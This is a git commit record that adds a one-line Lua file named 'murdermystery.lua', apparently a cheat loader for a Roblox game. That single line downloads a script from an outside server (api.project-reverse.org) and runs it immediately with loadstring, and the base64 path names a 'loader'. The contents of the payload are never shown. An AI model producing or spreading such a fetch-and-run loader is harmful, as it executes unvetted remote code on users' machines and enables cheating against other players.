ec02832821a8aebf2490c4cb53736755bca19796
xvzwhy <whosbuddyfr@gmail.com>
2026-06-22 12:11:05 -0400

    murdermystery.lua

---
+++ murdermystery.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImM2OWVlNjM3LTQyMmMtNDdmMy1iYjhiLWNjN2E5MTAwNzNhNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
